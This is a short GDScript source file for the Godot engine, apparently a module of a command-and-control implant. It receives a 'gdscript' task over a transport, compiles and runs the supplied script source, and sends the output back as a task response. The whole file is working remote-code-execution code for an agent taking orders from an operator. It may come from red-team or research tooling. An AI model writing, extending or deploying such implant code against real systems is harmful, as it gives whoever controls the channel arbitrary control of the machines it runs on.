extends Node

func _on_tasking_gdscript(transport, task):

	if task.has("command") and task.get("command") == "gdscript" and task.has("parameters"):
		# TODO: spawn a thread?
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var gdscript = GDScript.new()
		gdscript.source_code = parameters.get("script")
		gdscript.reload()
		var script_instance = gdscript.new()
		var output = script_instance.call("invoke")
		print("executing the following command and arguments")
		print(gdscript.source_code)
		print("")
		print(output)
		print("")

		transport.send(
			transport.create_task_response(
				true,
				true,
				task.get("id"),
				output
			)
		)

	else:
		print("bad gdscript task: ", task)
		# TODO: agent_response in failure cases
